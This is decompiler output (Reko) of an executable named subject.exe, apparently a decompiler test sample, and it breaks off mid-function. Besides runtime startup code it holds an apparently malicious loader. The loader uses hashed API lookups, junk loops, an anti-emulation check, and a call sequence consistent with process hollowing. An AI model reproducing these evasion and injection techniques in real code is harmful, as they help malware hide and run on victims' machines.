// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register word32 fn00401000(Stack Eq_3 dwArg04, Stack uint32 dwArg08)
word32 fn00401000(HMODULE dwArg04, uint32 dwArg08)
{
	uint32 esi_111 = dwArg08;
	struct Eq_6 * edx_24 = dwArg04 + (&dwArg04->unused)[0x0F] / 0x04;
	int32 eax_25 = 0x00;
	do
		eax_25 = eax_25 + 0x01;
	while (eax_25 <= 0x07);
	struct Eq_17 * eax_48 = dwArg04 + edx_24->dw0078 / 0x04;
	word16 eax_51[] = dwArg04 + eax_48->dw0024 / 0x04;
	int32 eax_54 = 0x0A;
	do
		eax_54 = eax_54 - 0x02;
	while (eax_54 >= 0x00);
	if (StgCreateStorageEx(null, 0x00, 0x00, 0x00, null, null, null, null) == 0x00)
		esi_111 = dwArg08 - 0x0005FF6B;
	word32 eax_114[] = dwArg04 + eax_48->dw0020 / 0x04;
	word32 eax_118[] = dwArg04 + eax_48->dw001C / 0x04;
	int32 edx_120 = 0x00;
	while (true)
	{
		word32 eax_150;
		if (edx_120 >= eax_48->dw0018)
			break;
		Eq_90 (* eax_173)[] = dwArg04 + eax_114[edx_120] / 0x04;
		dwLoc34 = dwLoc34 & 0x00;
		dwLoc38 = dwLoc38 & 0x00;
		while (Mem0[dwLoc34 + eax_173:byte] != 0x00)
		{
			dwLoc38 = (int32) Mem0[dwLoc34 + eax_173:byte] ^ 0x86 ^ (dwLoc38 << 0x07 | dwLoc38 >>u 0x19);
			dwLoc34 = dwLoc34 + 0x01;
		}
		if (dwLoc38 == esi_111)
		{
			eax_150 = dwArg04 + eax_118[(word32) eax_51[edx_120]] / 0x04;
			return eax_150;
		}
		edx_120 = edx_120 + 0x01;
	}
	eax_150 = 0x00;
	return eax_150;
}

// 004011B1: void fn004011B1()
void fn004011B1()
{
	GetModuleFileNameA(null, 0x00405688, 0x0104);
	lstrcpyA(4216716, 0x00404031);
	int32 eax_37 = 0x00;
	do
		eax_37 = eax_37 + 0x02;
	while (eax_37 <= 0x05);
	lstrcatA(4216716, 0x00405688);
	int32 eax_67 = 0x01;
	do
		eax_67 = eax_67 - 0x02;
	while (eax_67 >= 0x00);
	globals->dw405890 = 0x44;
	int32 eax_105 = 0x01;
	do
		eax_105 = eax_105 - 0x01;
	while (eax_105 >= 0x00);
	globals->dw4058BC = 0x01;
	globals->w4058C0 = 0x02;
	GetModuleHandleA(0x00);
	int32 eax_174 = 0x0A;
	do
		eax_174 = eax_174 - 0x02;
	while (eax_174 >= 0x00);
	ptr32 esp_213;
	word32 ebp_214;
	byte SCZO_215;
	word32 ebx_216;
	struct Eq_178 * esi_217;
	word32 edi_218;
	word32 eax_219;
	word32 edx_220;
	bool C_221;
	byte SZO_222;
	word32 ecx_223;
	byte cl_224;
	byte SO_225;
	globals->ptr4058E4();
	*(esp_213 - 0x04) = 0x40;
	*(esp_213 - 0x08) = 0x3000;
	*(esp_213 - 0x0C) = esi_217->dw0050;
	*(esp_213 - 0x10) = ebx_216;
	*(esp_213 - 0x14) = globals->dw4058D4;
	ptr32 esp_249;
	word32 ebp_250;
	byte SCZO_251;
	word32 ebx_252;
	struct Eq_225 * esi_253;
	word32 edi_254;
	word32 eax_255;
	word32 edx_256;
	bool C_257;
	byte SZO_258;
	word32 ecx_259;
	byte cl_260;
	byte SO_261;
	globals->ptr4058E8();
	int32 dwLoc2C_264 = dwLoc2C & 0x00;
	do
	{
		int32 v18_299 = dwLoc2C_264 + 0x02;
		dwLoc2C_264 = v18_299;
	} while (v18_299 <= 0x01);
	*(esp_249 - 0x04) = fp - 0x14;
	*(esp_249 - 0x08) = esi_253->dw0050;
	*(esp_249 - 0x0C) = ebx_252;
	*(esp_249 - 0x10) = eax_255;
	*(esp_249 - 0x14) = globals->dw4058D4;
	ptr32 esp_330;
	word32 ebp_331;
	byte SCZO_332;
	word32 ebx_333;
	word32 esi_334;
	word32 edi_335;
	word32 eax_336;
	word32 edx_337;
	bool C_338;
	byte SZO_339;
	word32 ecx_340;
	byte cl_341;
	byte SO_342;
	globals->ptr4058EC();
	globals->dw4058F0 = 0x00010007;
	*(esp_330 - 0x04) = 0x004058F0;
	*(esp_330 - 0x08) = globals->dw4058D8;
	ptr32 esp_385;
	word32 ebp_386;
	byte SCZO_387;
	word32 ebx_388;
	word32 esi_389;
	word32 edi_390;
	word32 eax_391;
	word32 edx_392;
	bool C_393;
	byte SZO_394;
	word32 ecx_395;
	byte cl_396;
	byte SO_397;
	globals->ptr405BBC();
	globals->dw4059A8 = 4199838;
	*(esp_385 - 0x04) = 0x004058F0;
	*(esp_385 - 0x08) = globals->dw4058D8;
	ptr32 esp_429;
	word32 ebp_430;
	byte SCZO_431;
	word32 ebx_432;
	word32 esi_433;
	word32 edi_434;
	word32 eax_435;
	word32 edx_436;
	bool C_437;
	byte SZO_438;
	word32 ecx_439;
	byte cl_440;
	byte SO_441;
	globals->ptr405BC0();
	int32 eax_442 = 0x00;
	do
		eax_442 = eax_442 + 0x04;
	while (eax_442 <= 0x05);
	*(esp_429 - 0x04) = globals->dw4058D8;
	word32 esp_462;
	word32 ebp_463;
	byte SCZO_464;
	word32 ebx_465;
	word32 esi_466;
	word32 edi_467;
	word32 eax_468;
	word32 edx_469;
	bool C_470;
	byte SZO_471;
	word32 ecx_472;
	byte cl_473;
	byte SO_474;
	globals->ptr405BC4();
}

// 0040186B: Register word32 fn0040186B(Register ptr32 ebp)
word32 fn0040186B(ptr32 ebp)
{
	Eq_3 eax_18 = LoadLibraryA(0x0040400C);
	globals->ptr4058E4 = fn00401000(eax_18, 2309928126);
	globals->ptr4058E8 = fn00401000(eax_18, 0x552086DF);
	globals->ptr4058EC = fn00401000(eax_18, 850956116);
	globals->ptr405BBC = fn00401000(eax_18, 1703137358);
	int32 eax_100 = 0x00;
	do
		eax_100 = eax_100 + 0x05;
	while (eax_100 <= 0x07);
	globals->ptr405BC0 = fn00401000(eax_18, 0x6583F84E);
	globals->ptr405BC4 = fn00401000(eax_18, 0x8C778146);
	globals->ptr405FD0 = fn00401000(eax_18, 0x8822AFB2);
	int32 eax_162 = 0x00;
	do
		eax_162 = eax_162 + 0x01;
	while (eax_162 <= 0x01);
	globals->ptr405BC8 = fn00401000(eax_18, 0x3F53BE5B);
	ptr32 esp_203;
	word32 ebp_204;
	byte SCZO_205;
	word32 ebx_206;
	word32 esi_207;
	word32 edi_208;
	word32 eax_209;
	word32 edx_210;
	word32 ecx_211;
	byte SZO_212;
	bool C_213;
	byte cl_214;
	byte SO_215;
	globals->ptr405BC8();
	int32 eax_219 = 0x01;
	do
		eax_219 = eax_219 - 0x05;
	while (eax_219 >= 0x00);
	*(esp_203 - 0x04) = 0x7AC45EAA;
	*(esp_203 - 0x08) = eax_209;
	globals->ptr405BCC = fn00401000(dwArg00, dwArg04);
	*(esp_203 - 0x04) = 4156949418;
	*(esp_203 - 0x08) = eax_209;
	globals->ptr405FD4 = fn00401000(dwArg00, dwArg04);
	int32 eax_280 = 0x00;
	do
		eax_280 = eax_280 + 0x02;
	while (eax_280 <= 0x06);
	*(esp_203 - 0x04) = 0x77E38D07;
	*(esp_203 - 0x08) = eax_209;
	globals->ptr405FD8 = fn00401000(dwArg00, dwArg04);
	int32 eax_312 = 0x00;
	do
		eax_312 = eax_312 + 0x03;
	while (eax_312 <= 0x02);
	*(esp_203 - 0x04) = 3586070787;
	*(esp_203 - 0x08) = eax_209;
	globals->ptr405FDC = fn00401000(dwArg00, dwArg04);
	int32 eax_337 = 0x07;
	do
		eax_337 = eax_337 - 0x04;
	while (eax_337 >= 0x00);
	*(esp_203 - 0x04) = 0x7F0CCB4C;
	*(esp_203 - 0x08) = eax_209;
	globals->ptr405FE0 = fn00401000(dwArg00, dwArg04);
	*(esp_203 - 0x04) = 0x00404019;
	ptr32 esp_396;
	word32 ebp_397;
	byte SCZO_398;
	word32 ebx_399;
	word32 esi_400;
	word32 edi_401;
	word32 eax_402;
	word32 edx_403;
	word32 ecx_404;
	byte SZO_405;
	bool C_406;
	byte cl_407;
	byte SO_408;
	globals->ptr405BC8();
	int32 eax_410 = 0x08;
	do
		eax_410 = eax_410 - 0x01;
	while (eax_410 >= 0x00);
	*(esp_396 - 0x04) = 2828334820;
	*(esp_396 - 0x08) = eax_402;
	globals->ptr405FE4 = fn00401000(dwArg00, dwArg04);
	int32 eax_427 = 0x06;
	do
		eax_427 = eax_427 - 0x03;
	while (eax_427 >= 0x00);
	fn004011B1();
	int32 eax_442 = 0x04;
	do
		eax_442 = eax_442 - 0x01;
	while (eax_442 >= 0x00);
	return 0x00;
}

// 00402050: Register Eq_36 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	fs->ptr0000 = fp - 0x14;
	globals->t405034 = fn00402C20(0x02000000);
	ptr32 ebp_121 = fp - 0x04;
	if (fn00402410() == 0x00)
		fn00402500(0x01);
	fn00402510(edx, ebx);
	fn00402580();
	fn004025D0(fp - 0x04);
	fn004029B0(fp - 0x04);
	fn00402A50();
	ptr32 esp_140 = fp - 0x70;
	<anonymous> ** ebx_153 = (<anonymous> **) 0x004040DC;
	while (ebx_153 < (<anonymous> **) 0x004040DC)
	{
		byte SCZO_143;
		word32 ebx_144;
		word32 esi_145;
		word32 edi_146;
		word32 ecx_147;
		word32 eax_148;
		byte SZO_149;
		bool C_150;
		bool Z_151;
		word32 edx_152;
		(*ebx_153)();
		ebx_153 = ebx_144 + 0x04;
	}
	Eq_125 edx_136;
	union Eq_125 * esp_63 = esp_140 - 0x04;
	*esp_63 = (union Eq_125 *) (fp - 100);
	GetStartupInfoA(*esp_63);
	*esp_63 = (union Eq_125 *) 0x00;
	Eq_3 eax_68 = GetModuleHandleA(*esp_63);
	word32 eax_71 = fn00402B10();
	if (0x00 != 0x00)
		edx_136 = (word32) wLoc34;
	else
		edx_136.u0 = 0x0A;
	*esp_63 = (union Eq_125 *) edx_136;
	*(esp_63 - 0x04) = eax_71;
	*(esp_63 - 0x08) = 0x00;
	*(esp_63 - 0x0C) = (HMODULE *) eax_68;
	Eq_36 eax_128 = fn0040186B(ebp_121);
	ptr32 esp_120 = (char *) esp_63 + 0x04;
	Eq_36 ebx_124 = eax_128;
	<anonymous> ** esi_133 = (<anonymous> **) 0x004040DC;
	while (esi_133 < (<anonymous> **) 0x004040DC)
	{
		byte SCZO_123;
		word32 esi_125;
		word32 edi_126;
		word32 ecx_127;
		byte SZO_129;
		bool C_130;
		bool Z_131;
		word32 edx_132;
		(*esi_133)();
		esi_133 = esi_125 + 0x04;
	}
	*(esp_120 - 0x04) = (uint32) ebx_124;
	fn00402B50(ebx_124, dwArg00);
	*(ebp_121 - 0x04) = *(ebp_121 - 0x04) | ~0x00;
	fs->ptr0000 = *(ebp_121 - 0x10);
	return eax_128;
}

// 00402410: Register word32 fn00402410()
word32 fn00402410()
{
	Eq_801 eax_8 = HeapCreate(0x01, 0x1000, 0x00);
	globals->t405674 = eax_8;
	if (eax_8 == null)
		return 0x00;
	return 0x01;
}

// 00402460: Register Eq_629 fn00402460(Stack Eq_629 dwArg04)
Eq_629 fn00402460(Eq_629 dwArg04)
{
	return HeapAlloc(globals->t405674, 0x01, dwArg04);
}

// 004024A0: void fn004024A0(Stack Eq_629 dwArg04)
void fn004024A0(Eq_629 dwArg04)
{
	HeapFree(globals->t405674, 0x01, dwArg04);
}

// 00402500: void fn00402500(Stack Eq_670 dwArg04)
void fn00402500(UINT dwArg04)
{
	ExitProcess(dwArg04);
}

// 00402510: void fn00402510(Register word32 edx, Register word32 ebx)
void fn00402510(word32 edx, word32 ebx)
{
	if ((SCZDOP ^ 0x00200000 ^ SCZDOP) != 0x00)
	{
		int32 eax_41;
		word32 ebx_42;
		Eq_842 ecx_43;
		word32 edx_44;
		__cpuid(0x00, SCZDOP, &eax_41, &ebx_42, &ecx_43, &edx_44);
		if (eax_41 >= 0x01)
		{
			word32 eax_48;
			word32 ebx_49;
			ui32 ecx_50;
			ui32 edx_51;
			__cpuid(0x01, ecx_43, &eax_48, &ebx_49, &ecx_50, &edx_51);
			ui32 eax_52 = 0x00;
			if ((edx_51 & 0x00800000) != 0x00)
				eax_52 = 0x01;
			if ((edx_51 & 0x01000000) != 0x00)
				eax_52 = eax_52 | 0x10;
			if ((edx_51 & 0x02000000) != 0x00)
				eax_52 = eax_52 | 0x02;
			if ((edx_51 & 0x04000000) != 0x00)
				eax_52 = eax_52 | 0x04;
			if ((ecx_50 & 0x01) != 0x00)
				eax_52 = eax_52 | 0x08;
			globals->dw4050EC = eax_52;
		}
	}
}

// 00402580: void fn00402580()
void fn00402580()
{
	GetSystemTimeAsFileTime(&globals->t405678);
}

// 004025D0: void fn004025D0(Register ptr32 ebp)
void fn004025D0(ptr32 ebp)
{
	Eq_917 eax_19 = fn004031F0(0x0100);
	Eq_917 ebx_22 = eax_19;
	if (eax_19 == 0x00)
		fn00402500(0x01);
	globals->t405FE8 = eax_19;
	globals->dw4060E8 = 0x20;
	while (ebx_22 < (word32) globals->t405FE8 + 0x0100)
	{
		*((word32) ebx_22 + 0x04) = 0x00;
		*ebx_22 = ~0x00;
		*((word32) ebx_22 + 0x05) = 0x0A;
		ebx_22 = (word32) ebx_22 + 0x08;
	}
	*(fp - 0x6C) = fp - 0x48;
	GetStartupInfoA(*(fp - 0x6C));
	if (wLoc16 != 0x00 && dwLoc14 != null)
	{
		int32 esi_194 = *dwLoc14;
		byte * dwLoc54_196 = dwLoc14 + 0x01;
		word32 * dwLoc50_199 = dwLoc14 + 0x01 + esi_194;
		if (esi_194 > 0x0800)
			esi_194 = 0x0800;
		ui32 edi_203 = 0x01;
		if (globals->dw4060E8 < esi_194)
		{
			do
			{
				*(fp - 0x6C) = 0x0100;
				Eq_917 eax_285 = fn004031F0(dwArg00);
				Eq_917 ebx_288 = eax_285;
				if (eax_285 == 0x00)
				{
					esi_194 = globals->dw4060E8;
					break;
				}
				(&globals->t405FE8)[edi_203] = eax_285;
				globals->dw4060E8 = globals->dw4060E8 + 0x20;
				while (ebx_288 < (&globals->t405FE8)[edi_203] + 0x0100)
				{
					*((word32) ebx_288 + 0x04) = 0x00;
					*ebx_288 = ~0x00;
					*((word32) ebx_288 + 0x05) = 0x0A;
					ebx_288 = (word32) ebx_288 + 0x08;
				}
				edi_203 = edi_203 + 0x01;
			} while (globals->dw4060E8 < esi_194);
		}
		int32 edi_214 = 0x00;
		if (esi_194 > 0x00)
		{
			do
			{
				word32 eax_227 = *dwLoc50_199;
				if (eax_227 != ~0x00)
				{
					ui32 edx_247 = (word32) *dwLoc54_196;
					if ((edx_247 & 0x01) == 0x00)
						goto l00402716;
					if ((edx_247 & 0x08) == 0x00)
					{
						*(fp - 0x6C) = eax_227;
						if (GetFileType(*(fp - 0x6C)) != 0x00)
							goto l004026F3;
					}
					else
					{
l004026F3:
						struct Eq_1234 * ebx_264 = (&globals->t405FE8)[edi_214 >> 0x05] + (edi_214 & 0x1F) * 0x08;
						ebx_264->dw0000 = *dwLoc50_199;
						ebx_264->b0004 = *dwLoc54_196;
					}
				}
l00402716:
				edi_214 = edi_214 + 0x01;
				dwLoc54_196 = dwLoc54_196 + 0x01;
				dwLoc50_199 = dwLoc50_199 + 0x01;
			} while (edi_214 < esi_194);
		}
	}
	int32 edi_60 = 0x00;
	do
	{
		struct Eq_1021 * ebx_76 = (word32) globals->t405FE8 + edi_60 * 0x08;
		if (ebx_76->t0000 == (void *) ~0x00)
		{
			word32 eax_110;
			ebx_76->b0004 = 0x81;
			if (edi_60 == 0x00)
				eax_110 = ~0x09;
			else if (edi_60 == 0x01)
				eax_110 = ~0x0A;
			else
				eax_110 = ~0x0B;
			*(fp - 0x6C) = eax_110;
			Eq_801 eax_113 = GetStdHandle(*(fp - 0x6C));
			Eq_801 esi_115 = eax_113;
			if (eax_113 != (void *) ~0x00)
			{
				*(fp - 0x6C) = (HANDLE *) eax_113;
				Eq_36 eax_128 = GetFileType(*(fp - 0x6C));
				if (eax_128 == 0x00)
					goto l004027C8;
				Eq_801 eax_134 = GetCurrentProcess();
				Eq_801 eax_136 = GetCurrentProcess();
				*(fp - 0x6C) = 0x02;
				*(fp - 0x70) = 0x01;
				*(fp - 116) = 0x00;
				*(fp - 0x78) = fp - 0x4C;
				*(fp - 0x7C) = (HANDLE *) eax_136;
				*(fp - 0x80) = (HANDLE *) eax_113;
				*(fp - 0x84) = (HANDLE *) eax_134;
				if (DuplicateHandle(*(fp - 0x84), *(fp - 0x80), *(fp - 0x7C), *(fp - 0x78), *(fp - 116), *(fp - 0x70), *(fp - 0x6C)) != 0x00)
					esi_115 = dwLoc4C;
				ebx_76->t0000 = esi_115;
				if ((eax_128 & 0xFF) == 0x02)
					ebx_76->b0004 = ebx_76->b0004 | 0x40;
				else if ((eax_128 & 0xFF) == 0x03)
					ebx_76->b0004 = ebx_76->b0004 | 0x08;
			}
			else
			{
l004027C8:
				ebx_76->b0004 = ebx_76->b0004 | 0x40;
			}
		}
		else
			ebx_76->b0004 = ebx_76->b0004 | 0x80;
		edi_60 = edi_60 + 0x01;
	} while (edi_60 < 0x03);
	*(fp - 0x6C) = globals->dw4060E8;
	SetHandleCount(*(fp - 0x6C));
}

// 00402820: void fn00402820(Stack Eq_116 dwArg04, Stack (ptr32 word32) dwArg08, Stack (ptr32 byte) dwArg0C, Stack (ptr32 word32) dwArg10, Stack (ptr32 word32) dwArg14)
void fn00402820(Eq_116 dwArg04, word32 * dwArg08, byte * dwArg0C, word32 * dwArg10, word32 * dwArg14)
{
	*dwArg14 = 0x00;
	*dwArg10 = 0x01;
	word32 * edx_19 = dwArg08;
	byte * ebx_105 = dwArg0C;
	Eq_116 edi_106 = dwArg04;
	if (dwArg08 != null)
	{
		*dwArg08 = dwArg0C;
		edx_19 = dwArg08 + 0x01;
	}
	if (*dwArg04 == 0x22)
	{
		while (true)
		{
			edi_106 = (word32) edi_106 + 0x01;
			if (*edi_106 == 0x22 || *edi_106 == 0x00)
				break;
			if (ebx_105 != null)
			{
				*ebx_105 = (byte) *edi_106;
				ebx_105 = ebx_105 + 0x01;
			}
			*dwArg14 = *dwArg14 + 0x01;
		}
		if (ebx_105 != null)
		{
			*ebx_105 = 0x00;
			ebx_105 = ebx_105 + 0x01;
		}
		*dwArg14 = *dwArg14 + 0x01;
		if (*edi_106 == 0x22)
			edi_106 = (word32) edi_106 + 0x01;
	}
	else
	{
		do
		{
			if (ebx_105 != null)
			{
				*ebx_105 = (byte) *edi_106;
				ebx_105 = ebx_105 + 0x01;
			}
			*dwArg14 = *dwArg14 + 0x01;
			edi_106 = (word32) edi_106 + 0x01;
			byte al_289 = *edi_106;
		} while (al_289 != 0x20 && (al_289 != 0x00 && al_289 != 0x09));
		if (al_289 == 0x00)
			edi_106 = edi_106 - 0x01;
		else if (ebx_105 != null)
			*(ebx_105 - 0x01) = 0x00;
	}
	word32 dwLoc08_101 = 0x00;
	while (true)
	{
		if (*edi_106 != 0x00)
		{
			while (true)
			{
				byte al_227 = *edi_106;
				if (al_227 != 0x20 && al_227 != 0x09)
					break;
				edi_106 = (word32) edi_106 + 0x01;
			}
		}
		if (*edi_106 == 0x00)
			break;
		if (edx_19 != null)
		{
			*edx_19 = ebx_105;
			edx_19 = edx_19 + 0x01;
		}
		*dwArg10 = *dwArg10 + 0x01;
		while (true)
		{
			uint32 dwLoc14_102 = 0x00;
			while (*edi_106 == 0x5C)
			{
				edi_106 = (word32) edi_106 + 0x01;
				dwLoc14_102 = dwLoc14_102 + 0x01;
			}
			word32 dwLoc0C_165 = 0x01;
			if (*edi_106 == 0x22)
			{
				dwLoc0C_165 = 0x01;
				if ((bLoc14 & 0x01) == 0x00)
				{
					if (dwLoc08_101 != 0x00)
					{
						if (*((word32) edi_106 + 0x01) == 0x22)
						{
							edi_106 = (word32) edi_106 + 0x01;
							dwLoc0C_165 = 0x01;
						}
						else
							dwLoc0C_165 = 0x00;
					}
					else
						dwLoc0C_165 = 0x00;
					dwLoc08_101 = (word32) (dwLoc08_101 == 0x00);
				}
				dwLoc14_102 = dwLoc14_102 >> 0x01;
			}
			while (true)
			{
				dwLoc14_102 = dwLoc14_102 - 0x01;
				if (dwLoc14_102 == 0x00)
					break;
				if (ebx_105 != null)
				{
					*ebx_105 = 0x5C;
					ebx_105 = ebx_105 + 0x01;
				}
				*dwArg14 = *dwArg14 + 0x01;
			}
			byte al_113 = *edi_106;
			if (al_113 == 0x00 || dwLoc08_101 == 0x00 && (al_113 == 0x20 || al_113 == 0x09))
				break;
			if (dwLoc0C_165 != 0x00)
			{
				if (ebx_105 != null)
				{
					*ebx_105 = (byte) *edi_106;
					ebx_105 = ebx_105 + 0x01;
				}
				*dwArg14 = *dwArg14 + 0x01;
			}
			edi_106 = (word32) edi_106 + 0x01;
		}
		if (ebx_105 != null)
		{
			*ebx_105 = 0x00;
			ebx_105 = ebx_105 + 0x01;
		}
		*dwArg14 = *dwArg14 + 0x01;
	}
	if (edx_19 != null)
		*edx_19 = 0x00;
	*dwArg10 = *dwArg10 + 0x01;
}

// 004029B0: void fn004029B0(Register ptr32 ebp)
void fn004029B0(ptr32 ebp)
{
	Eq_116 eax_13 = GetCommandLineA();
	Eq_116 ebx_14 = eax_13;
	if (*eax_13 == 0x00)
	{
		GetModuleFileNameA(null, fp - 0x0110, 0x0104);
		ebx_14 = fp - 0x0110;
	}
	fn00402820(ebx_14, null, null, fp - 0x08, fp - 0x0C);
	Eq_917 eax_40 = fn004031F0(dwLoc0C + dwLoc08 * 0x04);
	if (eax_40 == 0x00)
		fn00402500(0x01);
	*(fp - 0x011C) = fp - 0x0C;
	*(fp - 288) = fp - 0x08;
	*(fp - 292) = (word32) eax_40 + dwLoc08 * 0x04;
	*(fp - 0x0128) = (union Eq_917 *) eax_40;
	*(fp - 300) = (union Eq_116 *) ebx_14;
	fn00402820(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10);
	globals->dw40501C = dwLoc08 - 0x01;
	globals->t405020 = eax_40;
}

// 00402A50: void fn00402A50()
void fn00402A50()
{
	Eq_1692 eax_146 = GetEnvironmentStrings();
	Eq_1692 ebx_152 = eax_146;
	if (eax_146 == 0x00)
		ebx_152 = globals->t4050F0;
	Eq_1692 esi_148 = ebx_152;
	word32 ecx_145 = 0x00;
	while (*esi_148 != 0x00)
	{
		Eq_1709 eax_132 = eax_146 | ~0x00;
		do
			eax_132 = (word32) eax_132 + 0x01;
		while (Mem0[esi_148 + eax_132:byte] != 0x00);
		if (*esi_148 != 0x3D)
			ecx_145 = ecx_145 + (eax_132 + 0x01);
		eax_146 = eax_132 + 0x01;
		esi_148 = esi_148 + (eax_132 + 0x01);
	}
	Eq_917 eax_105 = fn004031F0(ecx_145 + 0x01);
	globals->t405028 = eax_105;
	Eq_917 edi_103 = eax_105;
	if (globals->t405028 == 0x00)
		fn00402500(0x01);
	Eq_1692 esi_107 = ebx_152;
	while (*esi_107 != 0x00)
	{
		Eq_1750 eax_85 = eax_105 | ~0x00;
		do
			eax_85 = (word32) eax_85 + 0x01;
		while (Mem48[esi_107 + eax_85:byte] != 0x00);
		if (*esi_107 != 0x3D)
		{
			*(fp - 0x18) = (union Eq_917 *) edi_103;
			Eq_1692 edx_110 = esi_107;
			int32 ecx_113 = edi_103 - esi_107;
			do
			{
				byte al_116 = *edx_110;
				*((word32) edx_110 + ecx_113) = al_116;
				edx_110 = edx_110 + 0x01;
			} while (al_116 != 0x00);
			edi_103 = edi_103 + (eax_85 + 0x01);
		}
		eax_105 = eax_85 + 0x01;
		esi_107 = esi_107 + (eax_85 + 0x01);
	}
	*edi_103 = 0x00;
	if (ebx_152 != globals->t4050F0)
	{
		*(fp - 0x18) = (union Eq_1692 *) ebx_152;
		FreeEnvironmentStringsA(*(fp - 0x18));
	}
}

// 00402B10: Register Eq_116 fn00402B10()
Eq_116 fn00402B10()
{
	Eq_116 eax_2 = GetCommandLineA();
	Eq_116 edx_10 = eax_2;
	if (*eax_2 == 0x22)
	{
		do
			edx_10 = edx_10 + 0x01;
		while (*edx_10 != 0x22 && *edx_10 != 0x00);
		if (*edx_10 == 0x22)
			edx_10 = edx_10 + 0x01;
	}
	else
	{
		while (*edx_10 > 0x20)
			edx_10 = edx_10 + 0x01;
	}
	while (true)
	{
		cu8 al_12 = *edx_10;
		if (al_12 == 0x00 || al_12 > 0x20)
			break;
		edx_10 = edx_10 + 0x01;
	}
	return edx_10;
}

// 00402B50: void fn00402B50(Register Eq_36 ebx, Stack word32 dwArg04)
void fn00402B50(DWORD ebx, word32 dwArg04)
{
	ptr32 esp_2 = fp - 0x04;
	word32 ebx_22 = dwArg04;
	if (globals->dw405234 >= 0x50)
	{
		if (globals->dw405238 != 0x00)
		{
			do
			{
				ui32 eax_33 = globals->dw405238;
				globals->dw405238 = eax_33 - 0x01;
				byte SCZO_40;
				bool C_41;
				word32 eax_42;
				word32 edx_43;
				bool Z_44;
				byte SZO_45;
				word32 ecx_46;
				(*((char *) globals->a4050F4 + (eax_33 - 0x01) * 0x04))();
			} while (globals->dw405238 != 0x00);
		}
		*(esp_2 - 0x04) = ebx_22;
		fn00402500(dwArg00);
	}
	else
		globals->dw405234 = globals->dw405234 + 0x01;
}

// 00402C20: Register word32 fn00402C20(Stack word32 dwArg04)
word32 fn00402C20(word32 dwArg04)
{
	return dwArg04;
}

// 00402CA0: Register word32 fn00402CA0(Stack uint32 dwArg04)
word32 fn00402CA0(uint32 dwArg04)
{
	word32 eax_134;
	uint32 ebx_17 = (dwArg04 + 0x03 >> 0x0E) + 0x01 << 0x0E;
	struct Eq_1918 * eax_23 = fn00403630(ebx_17 << 0x02);
	if (eax_23 == null)
	{
		globals->t405038.u0 = 0x00;
		eax_134 = 0x00;
	}
	else
	{
		uint32 esi_226;
		struct Eq_1918 * edi_224;
		if (globals->ptr405680 + globals->dw405684 / 0x04 == eax_23)
		{
			esi_226 = (ebx_17 << 0x02) + globals->dw405684;
			edi_224 = globals->ptr405680;
			ebx_17 = esi_226 >> 0x02;
		}
		else
		{
			edi_224 = eax_23;
			esi_226 = eax_23 + ((ebx_17 << 0x02) - eax_23) / 0x04;
		}
		globals->ptr405680 = edi_224 + ebx_17;
		globals->dw405684 = -(ebx_17 << 0x02) + esi_226;
		if (globals->ptr405260 + 0x01 == edi_224 && globals->ptr405268 != null)
		{
			ui32 * edi_193 = (char *) edi_224 - 0x04;
			uint32 eax_196 = (*edi_193 & 0x7FFFFFFF) + ebx_17;
			*edi_193 = ebx_17 | 0x80000000;
			ui32 * edx_201 = globals->ptr405260 + ebx_17 * 0x04;
			globals->ptr405260 = edx_201;
			*(edx_201 - 0x04) = *edi_193;
			*globals->ptr405260 = eax_196 | 0x80000000;
			(globals->ptr405260 - (eax_196 << 0x02))->dw0004 = eax_196 | 0x80000000;
			fn00403550(edi_193 + 0x01);
			eax_134 = 0x01;
		}
		else
		{
			struct Eq_1918 * eax_75 = globals->ptr405268;
			globals->ptr405268 = edi_224;
			edi_224->ptr0000 = eax_75;
			ui32 * edi_78 = (char *) &edi_224->ptr0000 + 0x04;
			globals->ptr405260 = edi_78;
			uint32 ebx_79 = ebx_17 - 0x01;
			ui32 * eax_81 = globals->ptr405264;
			if (eax_81 == null || eax_81 > edi_78)
				globals->ptr405264 = edi_78;
			int32 eax_104;
			*edi_78 = ebx_79 | 0x80000000;
			ui32 * eax_89 = globals->ptr405260 - 0x04 + ebx_79 * 0x04;
			globals->ptr405260 = eax_89;
			*eax_89 = ebx_79 | 0x80000000;
			ui32 * eax_95 = globals->ptr405260;
			if (ebx_79 - 0x02 <= globals->dw405278)
			{
				if (ebx_79 - 0x02 <= globals->dw405270)
					eax_104 = (word32) (ebx_79 - 0x02 > globals->dw40526C);
				else if (ebx_79 - 0x02 <= globals->dw405274)
					eax_104 = 0x02;
				else
					eax_104 = 0x03;
			}
			else if (ebx_79 - 0x02 <= globals->dw405280)
				eax_104 = ((word32) (ebx_79 - 0x02 <= globals->dw40527C) - 0x01 & 0x01) + 0x04;
			else if (ebx_79 - 0x02 <= globals->dw405284)
				eax_104 = 0x06;
			else
				eax_104 = 0x07;
			ptr32 edx_110;
			globals->dw405290 = eax_104;
			ptr32 eax_106 = globals->a40523C[eax_104 * 0x04];
			if (eax_106 == 0x00)
			{
				globals->a40523C[globals->dw405290 * 0x04] = eax_95 - 0x04;
				edx_110 = eax_95 - 0x04;
				eax_106 = eax_95 - 0x04;
				if (globals->dw40528C > globals->dw405290)
					globals->dw40528C = globals->dw405290;
			}
			else
				edx_110 = *(eax_106 - 0x08);
			*(eax_95 - 0x08) = eax_106;
			*(eax_106 - 0x08) = eax_95 - 0x04;
			*(edx_110 - 0x04) = eax_95 - 0x04;
			*(eax_95 - 0x0C) = edx_110;
			(-(ebx_79 - 0x02 << 0x02) + (eax_95 - 0x04))->dw0004 = ebx_79 - 0x02;
			*(eax_95 - 0x04) = ebx_79 - 0x02;
			globals->a40523C[globals->dw405290 * 0x04] = eax_95 - 0x04;
			while (true)
			{
				int32 eax_129 = globals->dw40528C;
				if (globals->a40523C[eax_129 * 0x04] != 0x00 || eax_129 >= 0x07)
					break;
				globals->dw40528C = globals->dw40528C + 0x01;
			}
			eax_134 = 0x01;
		}
	}
	return eax_134;
}

// 00402EF0: Register ptr32 fn00402EF0(Stack Eq_629 dwArg04)
ptr32 fn00402EF0(Eq_629 dwArg04)
{
	uint32 edx_19 = (word32) dwArg04 + 0x03 >> 0x02;
	uint32 ebx_20 = edx_19 + 0x02;
	if (edx_19 < ~0x01)
		ebx_20 = 0x04;
	int32 eax_31;
	if (ebx_20 <= globals->dw405278)
	{
		if (ebx_20 <= globals->dw405270)
			eax_31 = (word32) (ebx_20 > globals->dw40526C);
		else if (ebx_20 <= globals->dw405274)
